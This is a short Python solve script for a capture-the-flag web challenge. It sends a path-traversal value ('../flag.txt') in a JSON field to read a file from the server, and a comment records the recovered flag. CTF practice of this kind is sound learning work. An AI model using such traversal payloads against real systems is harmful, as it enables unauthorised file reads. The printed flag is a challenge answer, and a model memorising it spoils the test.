import requests

BASE_URL = "https://travel.ctf.pascalctf.it"

# Path Traversal via API parameter
# The backend reads files based on index: songs/{index}.json
# By sending "../flag.txt", we can read /app/flag.txt

r = requests.post(
    f"{BASE_URL}/api/get_json",
    headers={"Content-Type": "application/json"},
    json={"index": "../flag.txt"}
)

print("Response:", r.text)
# Flag: pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
